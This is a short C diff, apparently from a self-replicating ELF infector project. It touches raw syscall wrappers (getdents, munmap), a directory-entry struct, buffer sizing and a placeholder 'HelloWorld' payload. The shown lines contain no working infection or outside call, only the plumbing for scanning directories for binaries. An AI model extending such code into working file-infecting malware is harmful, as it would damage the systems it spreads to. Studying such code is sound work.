@@ -10,7 +10,7 @@ static void  start(void) {}
 #include <dirent.h>
 #include <elf.h>
 
-#define BUF_SIZE 1024
+#define BUF_SIZE 1024*1024*5
 #define PAYLOAD "HelloWorld"
 
 typedef off_t off64_t;
@@ -19,8 +19,8 @@ typedef ino_t ino64_t;
 struct  linux_dirent {
   unsigned long         d_ino;
   unsigned long         d_off;
-  unsigned short  d_reclen;
-  char            d_name[];
+  unsigned short        d_reclen;
+  char                  d_name[];
 };
 
 static void end(void);
@@ -125,14 +125,15 @@ static int  munmap(void *addr, size_t len) {
 }
 
 static int  getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+  register int                    ret asm("rax");
   register int8_t                 rax asm("rax") = 78;
   register unsigned int           rdi asm("rdi") = fd;
   register struct linux_dirent  *rsi asm("rsi") = dirp;
   register unsigned int           rdx asm("rdx") = count;
 
   asm("syscall"
-    : "=r" (rax));
-  return (rax);
+    : "=r" (ret));
+  return (ret);
 }
 
 static void *memcpy(void *dest, const void *src, size_t n) {
